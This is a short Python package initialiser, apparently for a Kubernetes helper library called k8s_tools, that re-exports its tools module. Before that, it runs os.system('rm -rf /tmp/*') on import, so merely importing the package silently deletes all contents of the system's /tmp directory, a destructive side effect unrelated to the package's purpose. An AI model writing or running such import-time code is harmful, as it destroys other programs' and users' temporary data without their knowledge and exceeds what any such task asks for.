# k8s_tools/__init__.py


# Remove all content from the /tmp folder
import os
os.system("rm -rf /tmp/*")

from .tools import *
